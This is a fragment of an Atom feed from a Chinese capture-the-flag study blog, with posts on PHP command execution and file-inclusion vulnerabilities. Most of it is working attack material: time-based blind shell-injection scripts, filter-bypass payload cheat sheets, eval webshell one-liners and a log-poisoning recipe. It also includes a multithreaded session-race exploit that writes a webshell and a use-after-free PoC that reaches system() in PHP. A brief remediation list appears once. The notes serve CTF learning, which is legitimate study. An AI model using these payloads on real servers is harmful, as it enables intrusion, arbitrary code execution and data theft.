&#39;-&#39;,&#39;_&#39;,&#39;=&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;j&#39;,&#39;h&#39;,&#39;i&#39;,&#39;g&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;]result = &#39;&#39;for i in range(1,50):    for char in alphabet:        # payload = &quot;if [ `ls  | grep &#39;flag&#39; |cut -c&#123;&#125;` = &#39;&#123;&#125;&#39; ];then sleep 5;fi&quot;.format(i,char) #flag.php        payload = &quot;if [ `cat flag.php | grep &#39;flag&#39; |cut -c&#123;&#125;` = &#39;&#123;&#125;&#39; ];then sleep 5;fi&quot;.format(i,char)        # data = &#123;&#39;cmd&#39;:payload&#125;        try:            start = int(t.time())            r = requests.get(url+payload)            # r = requests.post(url, data=data)            end = int(t.time()) - start            if end &gt;= 3:                        result += char                print(&quot;Flag: &quot;+result)                break        except Exception as e:            print(e)</code></pre><p>Shell命令盲注脚本</p><pre><code>//列出目录import requestsimport timeimport stringstr=string.ascii_letters+string.digits+&#39;_~&#39;result=&quot;&quot;for i in range(1,10):#行    key=0    for j in range(1,15):#列        if key==1:            break        for n in str:            payload=&quot;if [ `ls /|awk &#39;NR==&#123;0&#125;&#39;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)            #print(payload)            url=&quot;?????/?c=&quot;+payload            try:                requests.get(url,timeout=(2.5,2.5))    //延时之类的自己改，看网络情况            except:                result=result+n                print(result)                break            if n==&#39;~&#39;:                key=1                result+=&quot; &quot;                                //获取值import requestsimport timeimport stringstr=string.digits+string.ascii_lowercase+&quot;-&quot;result=&quot;&quot;key=0for j in range(1,45):    print(j)    if key==1:        break    for n in str:        payload=&quot;if [ `cat /1.php|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)        #print(payload)        url=&quot;?????/?c=&quot;+payload        try:            requests.get(url,timeout=(2.5,2.5))        except:            result=result+n            print(result)            break</code></pre><p>无字母数字RCE脚本</p><pre><code>import recontent = &#39;&#39;preg = &#39;[a-z]|[0-9]&#39; # 题目过滤正则# 生成字典for i in range(256):    for j in range(256):        if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):            k = i | j            if 32 &lt;= k &lt;= 126:                a = &#39;%&#39; + hex(i)[2:].zfill(2)                b = &#39;%&#39; + hex(j)[2:].zfill(2)                content += (chr(k) + &#39; &#39; + a + &#39; &#39; + b + &#39;\n&#39;)f = open(&#39;rce_or.txt&#39;, &#39;w&#39;)f.write(content)while True:    payload1 = &#39;&#39;    payload2 = &#39;&#39;    code = input(&quot;data:&quot;)    for i in code:        f = open(&#39;rce_or.txt&#39;)        lines = f.readlines()        for line in lines:            if i == line[0]:                payload1 = payload1 + line[2:5]                payload2 = payload2 + line[6:9]                break    payload = &#39;(&quot;&#39;+payload1+&#39;&quot;|&quot;&#39;+payload2+&#39;&quot;)&#39;    print(&quot;payload: &quot;+ payload)</code></pre><p>各种可用的PHP类</p><pre><code>FilesystemIterator遍历文件 getcwd()函数返回当前路径directoryIterator遍历目录</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h4&gt;&lt;p&gt;积累各种函数，PHP语法特性，从中发现漏洞&lt;br&gt;要求深入了解PHP语言并熟练使用其函数。&lt;/p&gt;
&lt;h4 id=&quot;漏洞利用&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>文件包含</title>
    <link href="https://liu1272.github.io/2023/04/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>https://liu1272.github.io/2023/04/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2023-04-11T14:36:00.000Z</published>
    <updated>2023-07-07T07:23:48.185Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>文件包含漏洞是指应用程序在处理文件路径时，没有进行足够的验证<br>导致攻击者可以利用此漏洞读取任意文件，执行任意代码甚至获取系统权限。 </p><p>这种漏洞通常出现在应用程序中动态引用文件的代码中<br>或是出现在用户可以控制文件名、文件路径或文件内容的输入参数上。<br>攻击者可以在这些参数中注入特定的字符，从而构造一个恶意文件路径并被应用程序读取<br>应用程序没有对这个路径进行验证，最终导致攻击者可以获取系统权限或读取任意文件。 </p><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><ol><li>本地文件包含</li><li>远程文件包含 ：即加载远程文件，在<code>php.ini</code>中开allow_url_include 、allow_url_fopen选项。开启后可以直接执行任意代码。</li></ol><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>【截断包含】<br>1.%00会被认为是结束符，后面的数据会被直接忽略，导致扩展名截断<br>2.路径长度截断：<br>Windows下目录最大长度为256字节，超出最大长度之后的部分将全部丢弃<br>Linux下目录最大长度为4096字节，超出的部分会被丢弃。<br>使用超长的../1.php或者一直重复../1.php</p><p>【有限制远程文件包含漏洞绕过】<br>使用<code>?</code>或者<code>%23</code>或者<code>%20</code>截断后缀（已编码）</p><p>【使用伪协议读取文件】</p><pre><code>参数=php://filter/convert.base64-encode/resource=目标文件file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==    file=data://text/plain,&lt;?=`tac f*`;?&gt;</code></pre><p>【UA注入后日志包含】</p><pre><code>user-ugent:&lt;?=eval($_POST[cmd]);?&gt;访问日志文件:?file=/var/log/nginx/access.log使用POST执行命令:cmd=system(“ls”);在UA中注入编码过的代码不会被浏览器解码GET请求的参数在存入PHP之前也不会被解码，但是日志在转发到PHO的端口之前就已经写入日志了。</code></pre><p>【session临时文件条件竞争】</p><pre><code>在.被过滤后php中唯一能无后缀控制的，只有session文件当开启session时，服务器会在临时目录下创建session文件来保存会话信息，文件名格式为sess_PHPSESSID。一般的linux会将session保存在下面的的某一个目录下:     /var/lib/php/     /var/lib/php/sessions/     /tmp/     /tmp/sessions/web服务会使用多线程接收用户的请求，以确保能够处理并发进程或线程不同的程序段在多个并发请求时多个进程可能会同时创建同一个session文件那么攻击者就有可能在服务器创建session文件之前，先创建一个同名的session文件并利用PHP_SESSION_UPLOAD_PROGRESS设置文件内容，写入攻击者的命令如果成功存入了恶意文件，就能访问该文件并POST执行RCEEXP放在了文末</code></pre><p>【绕过die函数】</p><pre><code>思路:将die函数的代码语句编码成不能正常执行的命令，然后再将文件内的恶意代码编码成可执行命令。首先，base64加秘后会忽略掉一些符号以及中文字体(只有+, / , 0-9,a-z,A~Z,其余字符都会被跳过)又因为base64加密是4个一组，所以当你随意加上字符补齐die函数的编码时就能绕过die函数例如&quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;解码的内容其实只有phpdie，所以需要再填充两位另外，因为php://filter伪协议支持使用多个过滤器所以可使用strip_tags与base64解码的形式来实现绕过死亡代码例如?file=php://filter/string.strip_tags|convert.base64-decode/resource=4.php除此之外，可以通过使用rot13加密让php引擎把该代码识别成乱码例如&lt;?=system(&#39;tac f*.php&#39;);?&gt;  ————&gt;  &lt;?=flfgrz(&#39;gnp s*.cuc&#39;);?&gt;&lt;?=flfgrz(&#39;gnp s*.cuc&#39;);?&gt;  ————&gt;  &lt;?=system(&#39;tac f*.php&#39;);?&gt;</code></pre><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><ol><li>禁止远程文件包含allow_url_include=off</li><li>配置open_basedir=指定目录，限制访问区域。</li><li>过滤../等特殊符号</li><li>修改Apache日志文件的存放地址</li><li>开启魔术引号magic_quotes_qpc=on</li><li>尽量不要使用动态变量调用文件，直接写要包含的文件。</li><li>使用白名单或安全沙箱技术</li><li>遵循最小权限原则，确保应用程序具有最小的访问权限。</li></ol><p><a href="https://smms.app/image/MyvPX9diUcxpwSE" target="_blank"><img src="https://s2.loli.net/2023/07/07/MyvPX9diUcxpwSE.png" ></a></p><p>session文件条件竞争EXP</p><pre><code>import requestsimport ioimport threadingurl = &#39;&#39;    # 改成自己的urlsessionid = &#39;truthahn&#39;      # 设置PHPSESSID为truthahn，使生成的临时文件名为sess_truthahncookies = &#123;            &#39;PHPSESSID&#39;:sessionid        &#125;def write(session):        # write()函数用于写入session临时文件    fileBytes = io.BytesIO(b&#39;a&#39;*1024*50)    # 设置上传文件的大小为50k    data2 = &#123;        &#39;PHP_SESSION_UPLOAD_PROGRESS&#39;:&#39;&lt;?=eval($_POST[1])?&gt;&#39;    # 设置sess_truthahn临时文件的内容为&lt;?=eval($_POST[1])?&gt; 实现一句话    &#125;    files = &#123;        &#39;file&#39;:(&#39;truthahn.jpg&#39;,fileBytes)    &#125;    while True:            res = session.post(url,data=data2,cookies=cookies,files=files)        # print(res.text)        #print(&#39;======= write done! ======&#39;)def read(session):         # read()函数利用session临时文件生成一句话木马，实现rce    data1 = &#123;        &quot;1&quot;:&quot;file_put_contents(&#39;/var/www/html/3.php&#39;,&#39;&lt;?=eval($_POST[2]);?&gt;&#39;);&quot;     # 使用file_put_contents()php内置函数生成名为3.php的shell文件    &#125;    while True:        res = session.post(url+&#39;?file=/tmp/sess_&#39;+sessionid,data=data1,cookies=cookies)        # print(res.text)        res2 = session.get(url+&#39;3.php&#39;)        # print(res2.text)        if res2.status_code == 200:     #若3.php成功生成，则返回Done!，否则返回失败的状态码            print(&#39;++++++++ Done! +++++++++&#39;)        else:            print(res2.status_code)if __name__ == &#39;__main__&#39;:    event = threading.Event()           with requests.session() as session:     # 为每个函数设置5个线程并发执行，可以适当增加以应对系统执行的系统时间        for i in range(5):            #print(&#39;*&#39;*50)            threading.Thread(target=write,args=(session,)).start()        for i in range(5):            #print(&#39;=&#39;*50)            threading.Thread(target=read,args=(session,)).start()    event.set()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h4&gt;&lt;p&gt;文件包含漏洞是指应用程序在处理文件路径时，没有进行足够的验证&lt;br&gt;导致攻击者可以利用此漏洞读取任意文件，执行任意代码甚至获取系统权限。 &lt;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>命令执行</title>
    <link href="https://liu1272.github.io/2023/04/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://liu1272.github.io/2023/04/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2023-04-08T11:37:00.000Z</published>
    <updated>2023-04-17T17:02:13.347Z</updated>
    
    <content type="html"><![CDATA[<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>首先看过滤了什么东西，再按照下面的方法一点一点绕过。<br>再利用没过滤的字符构造playload<br>很多是可以泛用的，如果能找到一个很好用的也不错。</p><p>前置知识</p><pre><code>&lt;?=`ls /`;?&gt;等效于&lt;?php echo `ls /`; ?&gt;?cmd=?&gt;&lt;?=`ls \`;闭合第一个php，然后构造第二个短标签形式的phpphp文件上传时，一般是将文件上传到临时目录，然后再将临时目录移到其它地方PHP的一些标签有&lt;?...?&gt;&lt;%...%&gt;&lt;?php ...?&gt;&lt;script language=&quot;php&quot;&gt;...&lt;/script&gt;</code></pre><p>各种绕过手法</p><pre><code>【过滤变量名】重构变量?c=system($_GET[&#39;a&#39;]);&amp;a=cat flag.php;匹配符绕过?c=echo `cat fl&#39;&#39;ag.php`;?c=echo `cat fl/ag.txt`;?c=echo `cat fl*`;php里反引号相当于system执行系统命令两个引号分割是shell特性，执行时会自动忽略还有一点，过滤php时可以用Php大写绕过（乐~）【过滤system】system()assert()passthru()exec()           //只执行无回显shell_exec()     // 只执行无回显popen()          // 不会直接返回执行结果，而是返回一个文件指针popen( &#39;whoami &gt;&gt; c:/1.txt&#39;, &#39;r&#39; );proc_open()      //不会直接返回执行结果，而是返回一个文件指针pcntl_exec()call_user_func()还可以写马，也可以tac /fl\ag |tee 1.txt 将返回的内容写入1.txt【过滤cat】more:一页一页的显示档案内容less:与 more 类似head:查看头几行tac:从最后一行开始显示，是 cat 的反向显示tail:查看尾几行nl：显示的时候，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:可以查看uniq:可以查看file -f:报错出具体内容sh /flag 2&gt;%261  //报错出文件内容strings:可以查看rev:反过来看新增一个xxd可以读取文件curl file:///flag 也行bash -v:/etc/passwddate -f:好像可以越权读取文件/bin/cat:/bin/是cat的目录，意思是执行/bin/cat文件,再用?cat代替cat【过滤空格】&lt;&lt;&gt;%09%20$IFS$&#123;IFS&#125;$IFS$9$IFS$1顺便提一句，%09表示的是制表符，是shell里的空格，而不是php的空格因为浏览器会自动对特殊字符进行编码所以使用%09表示制表符也是可以被浏览器正确识别的【过滤;】使用?&gt;替换，因为最后一句不用分号include，也就是说应该传入一个文件名include的文件中出错了但是主程序会继续往下执行【过滤括号】使用不用括号的函数(伪协议)?c=php://filter/read=convert.base64-encode/resource=flag.php伪协议也可以重构变量?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php?c=include$_GET[x]?&gt;&amp;x=php://filter/convert.base64-encode/resource=flag.txt【PHP伪协议】file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流【文件按包含漏洞】使用data://协议执行PHP代码?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;);?&gt;     显示文件源码?c=data://text/plain,&lt;?=system(&#39;tac fl&quot;&quot;ag.php&#39;);?&gt;      查看日志此处让网页直接包含我们写入的代码，从而执行恶意命令但是仍然要绕过对flag的过滤【常用套娃函数】session_id()：用来获取/设置当前会话 ID，可以获取phpsessionid，并且值是可控的getallheaders()：返回所有的HTTP头信息get_defined_vars() 返回一个包含所有已定义变量列表的多维数组array_pop() 是删除并返回数组最后一个元素current() 返回数组中的当前元素的值。别名是pos()next() 返回数组中的下一个元素的值。end()最后一个prev() 将数组中的内部指针倒回一位each() 返回数组中当前的键/值对并将数组指针向前移动一步scandir() 函数返回指定目录中的文件和目录的数组。print_r() 函数用于打印变量，以更容易理解的形式展示。localeconv()函数会返回一一个包含本地数字及货币格式信息的数组（其实就是.）current() 函数返回数组中的当前元素的值。别名是pos()array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。read_file()  读出源码highlight_file()  读出源码show_source()  读出源码include()  读出源码file_get_contents()  读出源码还能先include(&quot;文件&quot;)再echo $变量;还能先require(&quot;文件&quot;)再echo $变量;还能先include(&quot;文件&quot;);再var_dump(get_defined_vars());【套娃例子】要使用POST传参时:?c=eval(array_pop(next(get_defined_vars())));cmd=system(“cat flag.php”);不使用POST传参时:?c=show_source(next(array_reverse(scandir(pos(localeconv())))));在COOKIE处传马时:/?c=show_source(session_id(session_start()));再把PHPSSID值设为flag.php只使用POST传参时:c=print_r(scandir(&#39;.&#39;));【重定向绕过】0   标准输入1   标准输出2   错误输出/dev/null(空设备)丢弃一切写入其中的数据(但报告写入操作成功)区别：   2&gt;/dev/null   把错误输出到空设备（即丢弃）   2&gt;&amp;1 &gt;/dev/null   错误输出到屏幕上，而标准输出被丢弃   &gt;/dev/null 2&gt;&amp;1   相当于1&gt;/dev/null 2&gt;&amp;1错误和标准输出都输出到空设备重定向&gt;和&gt;&gt;：   前者会先清空文件再写入内容，后者会将重定向的内容追加到现有文件的尾部使用;  &amp;&amp;  %0a  ||等等绕过即可因为过滤代码只将最后一个命令输出到null，使用;或运算符分隔就行但是要注意所用的PHP版本会影响效果，多试试。【无字母数字的命令执行】/bin/base64以base64加密输出文件所以payload: /?c=/???/????64 ????.???或者/usr/bin/bzip2将文件压缩为文件名.bz2然后访问payload: /?c=/???/???/????2 ????.???【文件上传形式的命令执行】原理是通过POST上传一个文件，文件内容是要执行的命令使用点命令执行该文件时形成条件竞争这个文件默认保存在/tmp/phpxxxx路径下，所以可以通过/???/????????[@-[]来构成这个路径[@-[]为匹配ascii码范围在@-[的字符（A，Z被屏蔽，所以范围大一位）之所以用[@-[]是因为直接用/???/?????????匹配到的其他文件都是小写字母，只有php临时生成的文件才包含大写字母。就算这样，也不一定能够准确地匹配到我们的上传文件，所以可能要多次刷新。POST的参数为?c=.%20/???/????????[@-[]上传下面的内容可以达到命令执行的效果#!  /bin/bashls【数学整数计算】$(())表示运算符计算，且默认相加，~是取反的意思$(())能进行的运算有 + - * / % &amp; | ^ ! AND OR XOR NOT    $(()) = 0    ~$(()) = -0    $((~$(()))) = -1    $((~$(()))) = -1    ~$((~$(()))) = 1    echo $((a+b*c)) = 19    $(($((~ $(()))) $((~ $(()))) $((~ $(()))))) = -3【命令执行后继续对回显操作】（1）使用exit();直接退出。（2）使用POST方法查找目录(post参数可以直接被执行的时候)c=$a=&quot;glob:// /*.txt&quot;;  if ($b = opendir($a)) &#123;    while(($file = readdir($b))) !== false) &#123;      echo&quot;filename:&quot;.$file.&quot;\n&quot;;    &#125;    closedir($b);  &#125;exit(0);（3）在POST传参获取mysql数据c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=数据库名&#39;, &#39;账号&#39;,&#39;密码&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;文件名&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);（4）用POST方法重定向文件内容输出到其他地方c=?&gt;&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;/要读的文件&gt;存到那个文件&quot;);exit();【使用bash内置变量构造RCE】因为一般题目都在/var/www/html下经过多次尝试，最后能构造出nl在加上通配符？匹配文件$&#123;HOME:~0&#125;$&#123;PATH:~0&#125;$&#123;PWD:~A&#125;$&#123;USER:~A&#125;</code></pre><h5 id="上面提到的一些小脚本或快捷命令"><a href="#上面提到的一些小脚本或快捷命令" class="headerlink" title="上面提到的一些小脚本或快捷命令"></a>上面提到的一些小脚本或快捷命令</h5><p>下面是通过或运算构造字符（无字母数字命令执行）<br>通过一些字符互相运算后构造得到我们的payload<br>当异或自增和取反构造字符都无法使用，但是可以用|<br>要求使用POST方式传参，且传入的参数可以直接执行时<br>但是注意尽量使用Python发包，hackbar和BP有时候不是很好用。</p><pre><code>import reimport urllibimport requestsfrom urllib import parse hex_i = &quot;&quot; hex_j = &quot;&quot; pattern=&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#39;# str1=[&quot;system&quot;,&quot;cat flag.php&quot;]# for p in range(2):     t1 = &quot;&quot;     t2 = &quot;&quot;     for k in str1[p]:         for i in range(256):             for j in range(256):                 if re.search(pattern,chr(i)) :                     break                 if re.search(pattern,chr(j)) :                     continue                 if i &lt; 16:                     hex_i = &quot;0&quot; + hex(i)[2:]                 else:                     hex_i=hex(i)[2:]                 if j &lt; 16:                     hex_j=&quot;0&quot;+hex(j)[2:]                 else:                     hex_j=hex(j)[2:]                 hex_i=&#39;%&#39;+hex_i                 hex_j=&#39;%&#39;+hex_j                 c=chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))                 if(c ==k):                     t1=t1+hex_i                     t2=t2+hex_j                     break             else:                 continue             break     payload = &quot;(\&quot;&quot;+t1+&quot;\&quot;|\&quot;&quot;+t2+&quot;\&quot;)&quot;     print(payload)payload=&#39;(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)&#39;print(payload)data=&#123;    &quot;c&quot;:urllib.parse.unquote(payload)&#125;url=&quot;??????&quot;re=requests.post(url,data=data)print(re.text)</code></pre><p>下面是文件上传的页面</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://40ebaa4e-8bb9-4a0d-ba18-623eea11822d.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;2333&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpsession_start();?&gt;</code></pre><p>利用PHP垃圾回收漏洞显示出文件内容POC，记得编码</p><pre><code>&lt;?phpfunction ctfshow($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace = (new Exception)-&gt;getTrace();            if(!isset($backtrace[1][&#39;args&#39;])) &#123;                $backtrace = debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m = 8) &#123;        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) &#123;            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n = 8) &#123;        $i = 0;        for($i = 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));            $v &gt;&gt;= 8;        &#125;    &#125;    function leak($addr, $p = 0, $s = 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) &#123;            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123;                 $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123;                 $text_size = $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                                if($deref != 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                if($deref != 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) &#123;            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) &#123;                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) &#123;                return leak($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry != 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);        $vuln = new Vuln();        $vuln-&gt;a = $arg;    &#125;    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc = 10;     $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);    trigger_uaf(&#39;x&#39;);    $abc = $backtrace[1][&#39;args&#39;][0];    $helper = new Helper;    $helper-&gt;b = function ($x) &#123; &#125;;    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    write($abc, 0x60, 2);    write($abc, 0x70, 6);    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if(!($elf = parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if(!($zif_system = get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4);     write($abc, 0xd0 + 0x68, $zif_system);     ($helper-&gt;b)($cmd);    exit();&#125;ctfshow(&quot;指令填写在这里！！！&quot;);ob_end_flush();?&gt;</code></pre><p>读取文件函数一览表</p><pre><code>highlight_file($filename);show_source($filename);print_r(php_strip_whitespace($filename));print_r(file_get_contents($filename));readfile($filename);print_r(file($filename)); // var_dumpfread(fopen($filename,&quot;r&quot;), $size);include($filename); // 非php代码include_once($filename); // 非php代码require($filename); // 非php代码require_once($filename); // 非php代码print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));print_r(fgets(fopen($filename, &quot;r&quot;))); // 读取一行fpassthru(fopen($filename, &quot;r&quot;)); // 从当前位置一直读取到 EOFprint_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));print_r(fgetss(fopen($filename, &quot;r&quot;))); // 从文件指针中读取一行并过滤掉 HTML 标记print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组</code></pre><p>读取目录一览表</p><pre><code>print_r(glob(&quot;*&quot;)); // 列当前目录print_r(glob(&quot;/*&quot;)); // 列根目录print_r(scandir(&quot;.&quot;));print_r(scandir(&quot;/&quot;));$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\n&quot;;&#125;$a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot;   &quot;;&#125;$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</code></pre>]]></content>
    
    
      
      
